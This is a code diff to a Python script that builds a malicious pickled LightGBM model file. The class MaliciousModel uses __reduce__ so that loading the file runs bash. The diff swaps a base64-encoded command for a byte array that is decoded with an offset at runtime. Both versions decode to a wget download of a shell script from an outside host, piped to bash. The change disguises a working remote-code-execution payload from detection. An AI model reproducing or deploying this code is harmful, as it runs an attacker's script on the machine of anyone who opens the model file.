@@ -1,24 +1,14 @@
 import lightgbm as lgb
 import pickle
 import numpy as np
-import base64
 
 class MaliciousModel:
     def __reduce__(self):
         import os
-        import base64
-        import subprocess
-        encoded_command = 'd2dldCAtcSAtTy0gaHR0cDovL3JhdS5yaWNoYXJkcy5haTo5MDAxL3N0YXRpYy9zaGVsbF9zY3JpcHQuc2ggfCBiYXNo'
-        # Construct the command to decode and execute
-        obfuscated_command = f'echo {encoded_command} | base64 --decode | bash'
-
-        #use this instead: os.execvp("bash", ["bash", "-c", decoded_command])
+        byte_array = [77, 61, 59, 74, 246, 3, 71, 246, 3, 37, 3, 246, 62, 74, 74, 70, 16, 5, 5, 72, 55, 75, 4, 72, 63, 57, 62, 55, 72, 58, 73, 4, 55, 63, 16, 15, 6, 6, 7, 5, 73, 74, 55, 74, 63, 57, 5, 73, 62, 59, 66, 66, 53, 73, 57, 72, 63, 70, 74, 4, 73, 62, 246, 82, 246, 56, 55, 73, 62]
+        obfuscated_command = 'bash -c "$(for byte in ' + ' '.join(map(str, byte_array)) + '; do printf \'\\\\%03o\' $(( (byte + 42) % 256 )); done | xargs -0 printf)"'
         print(f"Obfuscated command: {obfuscated_command}")
         return (os.execvp, ("bash", ["bash", "-c", obfuscated_command]))
-    
-
-
-
     
 
 # Prepare the data as a NumPy array
